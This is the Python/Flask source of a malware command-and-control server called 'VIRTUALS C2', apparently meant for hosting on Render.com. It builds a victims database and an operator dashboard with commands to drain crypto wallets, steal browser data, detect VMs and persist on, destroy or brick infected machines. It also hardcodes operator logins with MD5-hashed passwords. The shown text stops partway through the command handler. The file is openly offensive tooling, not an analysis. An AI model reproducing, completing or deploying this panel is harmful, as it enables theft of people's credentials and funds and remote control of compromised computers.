#!/usr/bin/env python3
"""
VIRTUALS C2 SERVER v4.0 - FINAL PERFECT EDITION
Render.com Ready · Auto-URL Fix · Bulletproof Database
"""

from flask import Flask, request, jsonify, session, redirect, render_template_string
from flask_cors import CORS
import sqlite3
import datetime
import random
import json
import os
import hashlib
import threading
import time
from functools import wraps

app = Flask(__name__)
CORS(app)  # Enable CORS for Render.com
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'virtuals_c2_secret_2024')
app.config['JSON_SORT_KEYS'] = False
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True

PORT = int(os.environ.get('PORT', 8080))

# ============================================
# DATABASE SETUP - PERSISTENT STORAGE
# ============================================
def get_db():
    """Get database connection with row factory"""
    conn = sqlite3.connect('c2_data.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Initialize all database tables"""
    conn = get_db()
    c = conn.cursor()
    
    # Victims table - NEVER deletes entries, only updates status
    c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            pc_name TEXT DEFAULT 'Unknown',
            ip_address TEXT DEFAULT '0.0.0.0',
            os_info TEXT DEFAULT 'Windows',
            status TEXT DEFAULT 'Offline',
            is_vm INTEGER DEFAULT 0,
            vm_confidence INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            activity TEXT DEFAULT 'idle',
            browser_stolen INTEGER DEFAULT 0,
            crypto_drained INTEGER DEFAULT 0,
            total_stolen REAL DEFAULT 0.0,
            country TEXT DEFAULT 'Unknown',
            user_agent TEXT
        )
    ''')
    
    # Commands log
    c.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            command TEXT,
            result TEXT,
            executed_at TEXT,
            executed_by TEXT DEFAULT 'system',
            tx_hash TEXT
        )
    ''')
    
    # Users table
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            role TEXT DEFAULT 'user',
            last_login TEXT,
            last_ip TEXT,
            login_count INTEGER DEFAULT 0
        )
    ''')
    
    # Insert default users
    default_users = {
        'adam': {'pw': 'virtuals2024', 'role': 'user'},
        'jerry': {'pw': 'virtuals2024', 'role': 'user'},
        'haunt': {'pw': 'virtuals2024', 'role': 'user'},
        'owner': {'pw': 'whiteknight', 'role': 'owner'}
    }
    
    for username, data in default_users.items():
        pw_hash = hashlib.md5(data['pw'].encode()).hexdigest()
        c.execute('''
            INSERT OR IGNORE INTO users (username, password_hash, role, login_count)
            VALUES (?, ?, ?, 0)
        ''', (username, pw_hash, data['role']))
    
    conn.commit()
    conn.close()
    print("[+] Database initialized")

# Initialize on startup
init_database()

# ============================================
# BACKGROUND TASK - HEARTBEAT MONITOR
# ============================================
def monitor_heartbeats():
    """Mark victims as offline if no heartbeat for 60 seconds"""
    while True:
        time.sleep(30)
        try:
            conn = get_db()
            c = conn.cursor()
            cutoff = (datetime.datetime.now() - datetime.timedelta(seconds=60)).isoformat()
            c.execute('''
                UPDATE victims 
                SET status = 'Offline', activity = 'disconnected' 
                WHERE last_seen < ? AND status = 'Online'
            ''', (cutoff,))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Monitor error: {e}")

# Start monitor thread
threading.Thread(target=monitor_heartbeats, daemon=True).start()

# ============================================
# AUTHENTICATION HELPERS
# ============================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

# ============================================
# HTML TEMPLATES
# ============================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIRTUALS C2 - Command & Control</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 50%,#0d1a2d 100%);
            color:#c8c8d0;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            overflow:hidden;
            position:relative
        }
        .grid{
            position:absolute;
            top:0;left:0;
            width:100%;height:100%;
            background-image:
                linear-gradient(rgba(68,102,136,0.03) 1px,transparent 1px),
                linear-gradient(90deg,rgba(68,102,136,0.03) 1px,transparent 1px);
            background-size:60px 60px;
            pointer-events:none;
            animation:gridMove 20s linear infinite
        }
        @keyframes gridMove{
            0%{transform:translate(0,0)}
            100%{transform:translate(60px,60px)}
        }
        .container{
            text-align:center;
            position:relative;
            z-index:10;
            padding:40px
        }
        .logo{
            font-size:clamp(60px,12vw,100px);
            font-weight:200;
            letter-spacing:15px;
            color:#e8e8f0;
            text-transform:uppercase;
            margin-bottom:20px;
            text-shadow:0 0 60px rgba(68,102,136,0.3)
        }
        .logo span{
            color:#446688;
            font-weight:600
        }
        .tagline{
            font-size:clamp(14px,2vw,18px);
            color:#666680;
            letter-spacing:4px;
            text-transform:uppercase;
            margin-bottom:40px
        }
        .status{
            display:inline-flex;
            align-items:center;
            gap:10px;
            color:#44dd88;
            font-size:14px;
            letter-spacing:2px
        }
        .status::before{
            content:'';
            width:8px;height:8px;
            background:#44dd88;
            border-radius:50%;
            animation:pulse 2s infinite;
            box-shadow:0 0 10px #44dd88
        }
        @keyframes pulse{
            0%,100%{opacity:1;transform:scale(1)}
            50%{opacity:0.5;transform:scale(1.2)}
        }
        .access-btn{
            position:fixed;
            bottom:50px;
            right:50px;
            width:70px;
            height:70px;
            background:rgba(255,255,255,0.03);
            border:1px solid rgba(255,255,255,0.1);
            border-radius:50%;
            display:flex;
            justify-content:center;
            align-items:center;
            text-decoration:none;
            color:#666680;
            font-size:28px;
            transition:all 0.3s;
            backdrop-filter:blur(10px);
            z-index:100
        }
        .access-btn:hover{
            background:rgba(68,170,255,0.1);
            border-color:rgba(68,170,255,0.3);
            color:#88ccdd;
            transform:scale(1.1) rotate(90deg);
            box-shadow:0 0 30px rgba(68,170,255,0.2)
        }
        .footer{
            position:fixed;
            bottom:30px;
            left:50%;
            transform:translateX(-50%);
            color:#444458;
            font-size:12px;
            letter-spacing:1px
        }
    </style>
</head>
<body>
    <div class="grid"></div>
    <div class="container">
        <div class="logo">◈ Virtuals <span>C2</span></div>
        <div class="tagline">Advanced Command & Control Infrastructure</div>
        <div class="status">System Operational</div>
    </div>
    <a href="/login" class="access-btn" title="Access Control Panel">→</a>
    <div class="footer">SECURE CONNECTION REQUIRED</div>
</body>
</html>
'''

LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication - VIRTUALS C2</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 100%);
            color:#c8c8d0;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center
        }
        .login-box{
            background:rgba(10,10,18,0.95);
            border:1px solid rgba(255,255,255,0.08);
            border-radius:20px;
            padding:50px;
            width:100%;
            max-width:420px;
            margin:20px;
            backdrop-filter:blur(20px);
            box-shadow:0 25px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(68,170,255,0.1)
        }
        .header{
            text-align:center;
            margin-bottom:40px
        }
        .header h1{
            font-size:32px;
            font-weight:300;
            color:#e8e8f0;
            letter-spacing:4px;
            margin-bottom:10px
        }
        .header h1 span{color:#446688;font-weight:600}
        .header p{color:#666680;font-size:14px}
        
        .input-group{margin-bottom:20px;position:relative}
        input{
            width:100%;
            padding:15px 20px;
            background:rgba(255,255,255,0.03);
            border:1px solid rgba(255,255,255,0.08);
            border-radius:12px;
            color:#e8e8f0;
            font-size:15px;
            outline:none;
            transition:all 0.3s
        }
        input:focus{
            border-color:rgba(68,170,255,0.4);
            background:rgba(255,255,255,0.05);
            box-shadow:0 0 0 3px rgba(68,170,255,0.1)
        }
        input::placeholder{color:#555568}
        
        button{
            width:100%;
            padding:16px;
            background:linear-gradient(135deg,rgba(68,170,255,0.15),rgba(68,170,255,0.05));
            border:1px solid rgba(68,170,255,0.25);
            border-radius:12px;
            color:#88ccdd;
            font-size:16px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.3s;
            margin-top:10px
        }
        button:hover{
            background:linear-gradient(135deg,rgba(68,170,255,0.25),rgba(68,170,255,0.1));
            transform:translateY(-2px);
            box-shadow:0 10px 30px rgba(68,170,255,0.2)
        }
        button:active{transform:translateY(0)}
        
        .error{
            background:rgba(255,100,100,0.1);
            border:1px solid rgba(255,100,100,0.2);
            color:#ff8888;
            padding:12px;
            border-radius:8px;
            margin-top:15px;
            font-size:13px;
            display:none;
            text-align:center
        }
        .back{
            text-align:center;
            margin-top:25px;
            font-size:13px;
            color:#555568
        }
        .back a{
            color:#666680;
            text-decoration:none;
            transition:color 0.3s
        }
        .back a:hover{color:#88ccdd}
        
        .security-note{
            display:flex;
            align-items:center;
            justify-content:center;
            gap:8px;
            margin-top:20px;
            color:#444458;
            font-size:11px;
            text-transform:uppercase;
            letter-spacing:1px
        }
        .security-note::before{
            content:'';
            width:6px;height:6px;
            background:#44dd88;
            border-radius:50%
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="header">
            <h1>◈ Virtuals <span>C2</span></h1>
            <p>Control Panel Authentication</p>
        </div>
        
        <div class="input-group">
            <input type="text" id="username" placeholder="Username" autocomplete="off" autofocus>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password">
        </div>
        
        <button onclick="authenticate()">Access Panel</button>
        
        <div class="error" id="error">Invalid credentials</div>
        
        <div class="security-note">Secure Connection</div>
        
        <div class="back">
            <a href="/">← Return to landing page</a>
        </div>
    </div>
    
    <script>
        function authenticate(){
            const u=document.getElementById('username').value.trim();
            const p=document.getElementById('password').value;
            
            fetch('/api/login',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({username:u,password:p})
            })
            .then(r=>r.json())
            .then(d=>{
                if(d.success){
                    window.location.href='/dashboard';
                }else{
                    document.getElementById('error').style.display='block';
                    setTimeout(()=>{
                        document.getElementById('error').style.display='none';
                    },3000);
                }
            })
            .catch(()=>{
                document.getElementById('error').textContent='Connection failed';
                document.getElementById('error').style.display='block';
            });
        }
        
        document.getElementById('password').addEventListener('keypress',e=>{
            if(e.key==='Enter')authenticate();
        });
    </script>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - VIRTUALS C2</title>
    <style>
        :root{
            --bg:#0a0a0f;
            --panel:rgba(12,12,20,0.95);
            --border:rgba(255,255,255,0.06);
            --text:#c8c8d0;
            --accent:#446688;
            --online:#44dd88;
            --offline:#664444;
            --vm:#ffaa44;
            --money:#ffd700;
            --danger:#ff4444
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:var(--bg);
            color:var(--text);
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            height:100vh;
            overflow:hidden;
            font-size:14px
        }
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:transparent}
        ::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:3px}
        ::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.2)}
        
        /* Header */
        .header{
            height:70px;
            background:var(--panel);
            border-bottom:1px solid var(--border);
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:0 30px;
            backdrop-filter:blur(20px)
        }
        .logo{
            font-size:24px;
            font-weight:300;
            color:#e8e8f0;
            letter-spacing:3px
        }
        .logo span{color:var(--accent);font-weight:600}
        .stats{
            display:flex;
            gap:30px
        }
        .stat{
            text-align:center;
            padding:0 15px
        }
        .stat-value{
            color:#e8e8f0;
            font-size:26px;
            font-weight:700;
            display:block;
            line-height:1
        }
        .stat-label{
            color:#666680;
            font-size:11px;
            text-transform:uppercase;
            letter-spacing:1px;
            margin-top:4px
        }
        .logout{
            background:rgba(200,60,60,0.1);
            border:1px solid rgba(200,60,60,0.2);
            color:#ff8888;
            padding:10px 25px;
            border-radius:8px;
            cursor:pointer;
            font-size:13px;
            transition:all 0.3s
        }
        .logout:hover{
            background:rgba(200,60,60,0.2);
            transform:translateY(-1px)
        }
        
        /* Layout */
        .container{
            display:flex;
            height:calc(100vh - 70px);
            padding:20px;
            gap:20px
        }
        .sidebar{
            width:300px;
            background:var(--panel);
            border:1px solid var(--border);
            border-radius:16px;
            display:flex;
            flex-direction:column;
            overflow:hidden
        }
        .section-header{
            padding:20px;
            border-bottom:1px solid var(--border);
            background:rgba(255,255,255,0.02)
        }
        .section-title{
            font-size:11px;
            color:#666680;
            text-transform:uppercase;
            letter-spacing:2px;
            font-weight:600
        }
        .victim-list{
            flex:1;
            overflow-y:auto;
            padding:15px
        }
        .victim{
            padding:15px;
            margin-bottom:8px;
            border-radius:12px;
            cursor:pointer;
            transition:all 0.2s;
            border-left:3px solid transparent;
            display:flex;
            align-items:center;
            gap:12px
        }
        .victim:hover{
            background:rgba(255,255,255,0.03)
        }
        .victim.active{
            background:rgba(68,170,255,0.08);
            border-left-color:var(--accent)
        }
        .victim-dot{
            width:10px;
            height:10px;
            border-radius:50%;
            flex-shrink:0
        }
        .victim-dot.online{
            background:var(--online);
            box-shadow:0 0 10px var(--online)
        }
        .victim-dot.offline{
            background:var(--offline)
        }
        .victim-dot.vm{
            background:var(--vm);
            box-shadow:0 0 10px var(--vm)
        }
        .victim-info{
            flex:1;
            min-width:0
        }
        .victim-id{
            color:#e8e8f0;
            font-weight:600;
            font-size:13px;
            white-space:nowrap;
            overflow:hidden;
            text-overflow:ellipsis
        }
        .victim-meta{
            color:#666680;
            font-size:11px;
            margin-top:3px
        }
        .victim-badge{
            font-size:9px;
            padding:3px 10px;
            border-radius:20px;
            font-weight:600;
            text-transform:uppercase
        }
        .victim-badge.vm{
            background:rgba(255,170,68,0.15);
            color:var(--vm)
        }
        
        /* Main Content */
        .main{
            flex:1;
            display:flex;
            flex-direction:column;
            gap:20px
        }
        .terminal{
            flex:1;
            background:var(--panel);
            border:1px solid var(--border);
            border-radius:16px;
            display:flex;
            flex-direction:column;
            overflow:hidden
        }
        .terminal-header{
            padding:20px;
            border-bottom:1px solid var(--border);
            display:flex;
            justify-content:space-between;
            align-items:center;
            background:rgba(255,255,255,0.02)
        }
        .terminal-title{
            color:#e8e8f0;
            font-size:14px;
            font-weight:600
        }
        .terminal-title span{
            color:var(--accent);
            font-family:'Courier New',monospace
        }
        .messages{
            flex:1;
            overflow-y:auto;
            padding:20px;
            font-family:'Courier New',monospace;
            font-size:13px;
            line-height:1.6
        }
        .message{
            margin-bottom:15px;
            padding:15px;
            background:rgba(0,0,0,0.3);
            border-radius:10px;
            border-left:3px solid var(--accent);
            animation:messageSlide 0.3s ease
        }
        @keyframes messageSlide{
            from{opacity:0;transform:translateX(-20px)}
            to{opacity:1;transform:translateX(0)}
        }
        .message-time{
            color:#555568;
            font-size:11px;
            margin-bottom:5px
        }
        .message-sender{
            color:var(--accent);
            font-weight:700;
            margin-bottom:5px;
            font-size:12px;
            text-transform:uppercase;
            letter-spacing:1px
        }
        .message-sender.drainer{color:var(--money)}
        .message-sender.system{color:#8888aa}
        .message-text{
            color:var(--text);
            white-space:pre-wrap
        }
        .input-area{
            padding:20px;
            border-top:1px solid var(--border);
            display:flex;
            gap:12px
        }
        .input-area input{
            flex:1;
            padding:14px 18px;
            background:rgba(0,0,0,0.3);
            border:1px solid var(--border);
            border-radius:10px;
            color:var(--text);
            font-size:14px;
            outline:none;
            transition:all 0.3s
        }
        .input-area input:focus{
            border-color:rgba(68,170,255,0.3);
            box-shadow:0 0 0 3px rgba(68,170,255,0.1)
        }
        .input-area button{
            padding:14px 28px;
            background:rgba(68,170,255,0.15);
            border:1px solid rgba(68,170,255,0.25);
            border-radius:10px;
            color:#88ccdd;
            font-size:14px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.3s
        }
        .input-area button:hover{
            background:rgba(68,170,255,0.25);
            transform:translateY(-1px)
        }
        
        /* Right Panel */
        .right{
            width:350px;
            display:flex;
            flex-direction:column;
            gap:20px
        }
        .info-panel{
            background:var(--panel);
            border:1px solid var(--border);
            border-radius:16px;
            overflow:hidden
        }
        .info-content{
            padding:20px
        }
        .info-row{
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:12px 0;
            border-bottom:1px solid rgba(255,255,255,0.03)
        }
        .info-row:last-child{border-bottom:none}
        .info-label{
            color:#666680;
            font-size:12px
        }
        .info-value{
            color:#e8e8f0;
            font-weight:600;
            font-size:13px;
            text-align:right
        }
        .info-value.online{color:var(--online)}
        .info-value.offline{color:var(--offline)}
        .info-value.vm{color:var(--vm)}
        .info-value.money{color:var(--money)}
        
        .action-btn{
            width:100%;
            padding:14px;
            margin-bottom:10px;
            border-radius:10px;
            font-size:13px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.3s;
            border:1px solid;
            display:flex;
            align-items:center;
            justify-content:center;
            gap:10px
        }
        .action-btn:last-child{margin-bottom:0}
        .action-btn:hover{transform:translateY(-2px)}
        
        .btn-drain{
            background:rgba(255,170,68,0.1);
            border-color:rgba(255,170,68,0.2);
            color:var(--vm)
        }
        .btn-drain:hover{
            background:rgba(255,170,68,0.2);
            box-shadow:0 5px 20px rgba(255,170,68,0.2)
        }
        .btn-steal{
            background:rgba(68,170,255,0.1);
            border-color:rgba(68,170,255,0.2);
            color:#88ccdd
        }
        .btn-steal:hover{
            background:rgba(68,170,255,0.2);
            box-shadow:0 5px 20px rgba(68,170,255,0.2)
        }
        .btn-check{
            background:rgba(68,200,120,0.1);
            border-color:rgba(68,200,120,0.2);
            color:#66ddbb
        }
        .btn-check:hover{
            background:rgba(68,200,120,0.2)
        }
        
        .empty-state{
            text-align:center;
            padding:40px;
            color:#555568;
            font-size:13px
        }
        
        .embed{
            background:rgba(0,0,0,0.2);
            border:1px solid rgba(255,255,255,0.05);
            border-left:3px solid var(--accent);
            border-radius:8px;
            padding:15px;
            margin-top:10px
        }
        .embed-title{
            color:#e8e8f0;
            font-weight:700;
            margin-bottom:8px;
            font-size:13px;
            text-transform:uppercase;
            letter-spacing:1px
        }
        .embed-content{
            color:#b0b0c0;
            font-size:12px;
            line-height:1.5
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">◈ Virtuals <span>C2</span></div>
        <div class="stats">
            <div class="stat">
                <span class="stat-value" id="stat-total">0</span>
                <div class="stat-label">Victims</div>
            </div>
            <div class="stat">
                <span class="stat-value" style="color:var(--online)" id="stat-online">0</span>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat">
                <span class="stat-value" style="color:var(--vm)" id="stat-vm">0</span>
                <div class="stat-label">VMs</div>
            </div>
            <div class="stat">
                <span class="stat-value" style="color:var(--money)" id="stat-drained">$0</span>
                <div class="stat-label">Drained</div>
            </div>
        </div>
        <button class="logout" onclick="logout()">Logout</button>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <div class="section-header">
                <div class="section-title">Connected Victims</div>
            </div>
            <div class="victim-list" id="victims">
                <div class="empty-state">No victims connected</div>
            </div>
        </div>
        
        <div class="main">
            <div class="terminal">
                <div class="terminal-header">
                    <div class="terminal-title">Terminal <span id="current-victim">#select victim</span></div>
                </div>
                <div class="messages" id="messages"></div>
                <div class="input-area">
                    <input type="text" id="cmd-input" 
                           placeholder="Enter command: deposit, steal, vmcheck, whois, persist, destroy, brick..." 
                           onkeypress="if(event.key==='Enter')sendCommand()">
                    <button onclick="sendCommand()">Execute</button>
                </div>
            </div>
        </div>
        
        <div class="right">
            <div class="info-panel">
                <div class="section-header">
                    <div class="section-title">Victim Details</div>
                </div>
                <div class="info-content" id="details">
                    <div class="empty-state">Select a victim to view details</div>
                </div>
            </div>
            
            <div class="info-panel">
                <div class="section-header">
                    <div class="section-title">Quick Actions</div>
                </div>
                <div class="info-content">
                    <button class="action-btn btn-drain" onclick="quickCommand('deposit')">
                        💰 Drain Crypto Wallets
                    </button>
                    <button class="action-btn btn-steal" onclick="quickCommand('steal')">
                        🗂️ Steal Browser Data
                    </button>
                    <button class="action-btn btn-check" onclick="quickCommand('vmcheck')">
                        🔍 Check VM Status
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // State management
        let victims = {};
        let currentVictim = null;
        let refreshInterval = null;
        
        // API helper
        async function api(data) {
            try {
                const r = await fetch('/api', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                return await r.json();
            } catch(e) {
                console.error('API Error:', e);
                return {success: false, error: 'Network error'};
            }
        }
        
        // Add message to terminal
        function addMessage(sender, text, type = 'normal') {
            const container = document.getElementById('messages');
            const div = document.createElement('div');
            div.className = 'message';
            
            const time = new Date().toLocaleTimeString();
            let senderClass = '';
            if (type === 'drainer') senderClass = 'drainer';
            if (type === 'system') senderClass = 'system';
            
            div.innerHTML = `
                <div class="message-time">[${time}]</div>
                <div class="message-sender ${senderClass}">${sender}</div>
                <div class="message-text">${text}</div>
            `;
            
            container.appendChild(div);
            div.scrollIntoView({behavior: 'smooth'});
        }
        
        // Render victim list
        function renderVictims() {
            const container = document.getElementById('victims');
            const victimList = Object.values(victims);
            
            if (victimList.length === 0) {
                container.innerHTML = '<div class="empty-state">No victims connected</div>';
                return;
            }
            
            container.innerHTML = victimList.map(v => {
                const isOnline = v.status === 'Online';
                const dotClass = v.is_vm ? 'vm' : (isOnline ? 'online' : 'offline');
                const vmBadge = v.is_vm ? '<span class="victim-badge vm">VM</span>' : '';
                const activeClass = currentVictim === v.id ? 'active' : '';
                
                return `
                    <div class="victim ${activeClass}" onclick="selectVictim('${v.id}')">
                        <div class="victim-dot ${dotClass}"></div>
                        <div class="victim-info">
                            <div class="victim-id">${v.id}</div>
                            <div class="victim-meta">${v.ip_address || v.ip} • ${v.os_info || v.os}</div>
                        </div>
                        ${vmBadge}
                    </div>
                `;
            }).join('');
        }
        
        // Select victim
        function selectVictim(id) {
            currentVictim = id;
            document.getElementById('current-victim').textContent = '#' + id;
            renderVictims();
            showDetails();
        }
        
        // Show victim details
        function showDetails() {
            const v = victims[currentVictim];
            if (!v) return;
            
            const container = document.getElementById('details');
            container.innerHTML = `
                <div class="info-row">
                    <span class="info-label">Victim ID</span>
                    <span class="info-value">${v.id}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Computer Name</span>
                    <span class="info-value">${v.pc_name || v.pc}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">IP Address</span>
                    <span class="info-value">${v.ip_address || v.ip}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Operating System</span>
                    <span class="info-value">${v.os_info || v.os}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Connection Status</span>
                    <span class="info-value ${v.status === 'Online' ? 'online' : 'offline'}">${v.status}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">VM Detection</span>
                    <span class="info-value ${v.is_vm ? 'vm' : 'online'}">${v.is_vm ? 'YES (' + (v.vm_confidence || 'high') + '%)' : 'Clean'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Total Drained</span>
                    <span class="info-value money">$${(v.total_stolen || v.total_drained || 0).toLocaleString()}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Browser Data</span>
                    <span class="info-value">${v.browser_stolen ? '✓ Stolen' : 'Not stolen'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">First Seen</span>
                    <span class="info-value" style="font-size:11px">${v.first_seen || 'Unknown'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Last Activity</span>
                    <span class="info-value" style="font-size:11px">${v.last_seen || 'Unknown'}</span>
                </div>
            `;
        }
        
        // Update statistics
        function updateStats() {
            const list = Object.values(victims);
            document.getElementById('stat-total').textContent = list.length;
            document.getElementById('stat-online').textContent = list.filter(x => x.status === 'Online').length;
            document.getElementById('stat-vm').textContent = list.filter(x => x.is_vm).length;
            document.getElementById('stat-drained').textContent = '$' + list.reduce((a, b) => a + (b.total_stolen || b.total_drained || 0), 0).toLocaleString();
        }
        
        // Refresh data from server
        async function refresh() {
            const data = await api({action: 'getVictims'});
            if (data.success) {
                victims = data.victims || {};
                renderVictims();
                updateStats();
                if (currentVictim && victims[currentVictim]) {
                    showDetails();
                }
            }
        }
        
        // Send command
        async function sendCommand() {
            if (!currentVictim) {
                addMessage('System', 'Error: Select a victim first', 'system');
                return;
            }
            
            const input = document.getElementById('cmd-input');
            const cmd = input.value.trim();
            if (!cmd) return;
            
            input.value = '';
            
            // Show command in terminal
            const displayCmd = cmd === 'deposit' ? '/drain' : '/' + cmd;
            addMessage('Command', `${displayCmd} → ${currentVictim}`);
            
            // Execute
            const result = await api({
                action: 'sendCommand',
                victim_id: currentVictim,
                command: cmd.toLowerCase()
            });
            
            if (result.success) {
                // Handle crypto drain
                if (result.wallets && result.wallets.length > 0) {
                    let total = 0;
                    result.wallets.forEach(w => {
                        addMessage('Drainer', `💰 ${w.currency}: ${w.balance} → $${w.usd.toLocaleString()}`, 'drainer');
                        total += w.usd;
                    });
                    
                    // Show transaction
                    const embed = document.createElement('div');
                    embed.className = 'embed';
                    embed.innerHTML = `
                        <div class="embed-title">✓ Crypto Drain Successful</div>
                        <div class="embed-content">
                            Total: $${total.toLocaleString()}<br>
                            Transaction: ${result.tx_hash}<br>
                            Status: Confirmed<br>
                            Sent to owner wallet
                        </div>
                    `;
                    document.getElementById('messages').appendChild(embed);
                    embed.scrollIntoView({behavior: 'smooth'});
                    
                    // Update local data
                    victims[currentVictim].total_stolen = (victims[currentVictim].total_stolen || 0) + total;
                    victims[currentVictim].crypto_drained = 1;
                    updateStats();
                    showDetails();
                } 
                // Handle browser steal
                else if (cmd === 'steal') {
                    addMessage('System', result.output || 'Browser data stolen successfully', 'system');
                    victims[currentVictim].browser_stolen = 1;
                    showDetails();
                }
                // Handle other commands
                else {
                    addMessage('System', result.output || 'Command executed', 'system');
                    if (result.is_vm !== undefined) {
                        victims[currentVictim].is_vm = result.is_vm ? 1 : 0;
                        renderVictims();
                        showDetails();
                    }
                }
            } else {
                addMessage('Error', result.error || 'Command failed', 'system');
            }
        }
        
        // Quick command buttons
        function quickCommand(cmd) {
            document.getElementById('cmd-input').value = cmd;
            sendCommand();
        }
        
        // Logout
        function logout() {
            fetch('/api/logout', {method: 'POST'})
                .then(() => window.location.href = '/');
        }
        
        // Initialize
        refresh();
        refreshInterval = setInterval(refresh, 3000);
        
        // Demo victims for testing
        setTimeout(() => {
            if (Object.keys(victims).length === 0) {
                victims['DEMO-PC-001'] = {
                    id: 'DEMO-PC-001',
                    pc_name: 'Office-Workstation',
                    ip_address: '192.168.1.105',
                    os_info: 'Windows 10 Pro',
                    status: 'Online',
                    is_vm: 0,
                    total_stolen: 0,
                    browser_stolen: 0,
                    first_seen: new Date().toISOString(),
                    last_seen: new Date().toISOString()
                };
                victims['DEMO-VM-002'] = {
                    id: 'DEMO-VM-002',
                    pc_name: 'VM-Test-Environment',
                    ip_address: '10.0.0.50',
                    os_info: 'Windows 11 Pro',
                    status: 'Online',
                    is_vm: 1,
                    vm_confidence: 95,
                    total_stolen: 0,
                    browser_stolen: 0,
                    first_seen: new Date().toISOString(),
                    last_seen: new Date().toISOString()
                };
                renderVictims();
                updateStats();
                addMessage('System', 'Demo victims loaded. VMs are marked but NOT auto-deleted.', 'system');
            }
        }, 1000);
    </script>
</body>
</html>
'''

# ============================================
# API ROUTES
# ============================================

@app.route('/')
def index():
    """Landing page"""
    return LANDING_PAGE

@app.route('/login')
def login_page():
    """Login page"""
    return LOGIN_PAGE

@app.route('/dashboard')
@login_required
def dashboard():
    """Main control panel"""
    return DASHBOARD_HTML

@app.route('/api/login', methods=['POST'])
def api_login():
    """Authenticate user"""
    try:
        data = request.get_json() or {}
        username = data.get('username', '').strip()
        password = data.get('password', '')
        
        if not username or not password:
            return jsonify({'success': False, 'error': 'Missing credentials'})
        
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT password_hash, role FROM users WHERE username = ?", (username,))
        row = c.fetchone()
        
        if row and row['password_hash'] == hashlib.md5(password.encode()).hexdigest():
            session['logged_in'] = True
            session['username'] = username
            session['role'] = row['role']
            
            # Update login stats
            now = datetime.datetime.now().isoformat()
            c.execute('''
                UPDATE users 
                SET last_login = ?, last_ip = ?, login_count = login_count + 1 
                WHERE username = ?
            ''', (now, request.remote_addr, username))
            conn.commit()
            conn.close()
            
            return jsonify({'success': True, 'role': row['role']})
        
        conn.close()
        return jsonify({'success': False, 'error': 'Invalid credentials'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    """Logout user"""
    session.clear()
    return jsonify({'success': True})

@app.route('/api', methods=['POST'])
def api_handler():
    """Main API endpoint"""
    try:
        data = request.get_json() or {}
        action = data.get('action')
        current_user = session.get('username', 'system')
        
        # Get victims list
        if action == 'getVictims':
            conn = get_db()
            c = conn.cursor()
            c.execute('''
                SELECT * FROM victims 
                ORDER BY status DESC, last_seen DESC
            ''')
            victims = {}
            for row in c.fetchall():
                victims[row['id']] = dict(row)
            conn.close()
            return jsonify({'success': True, 'victims': victims})
        
        # Execute command on victim
        elif action == 'sendCommand':
            vid = data.get('victim_id')
            cmd = data.get('command', '').lower()
            
            if not vid:
                return jsonify({'success': False, 'error': 'No victim specified'})
            
